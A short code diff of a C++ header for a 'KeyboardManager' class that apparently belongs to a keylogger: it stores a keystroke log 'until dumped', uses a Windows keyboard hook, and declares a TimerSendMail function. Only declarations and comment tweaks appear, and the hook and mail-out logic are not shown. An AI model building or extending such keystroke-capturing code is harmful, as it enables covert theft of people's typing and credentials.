@@ -10,7 +10,6 @@ class KeyboardManager
 {
 
 public:
-	// KeyboardManager constructor
 	KeyboardManager();
 
 	// Begins logging keystrokes
@@ -21,13 +20,14 @@ public:
 
 	bool IsHooked() const {	return eHook == NULL; }
 
-	std::string keylog;
+	// Keeps track of keystrokes until dumped
+	std::string keylog = "";
 
 private:
 	// Handles key presses and releases
 	LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);
 
-	HHOOK eHook;
+	HHOOK eHook = NULL;
 };
 
 void TimerSendMail();
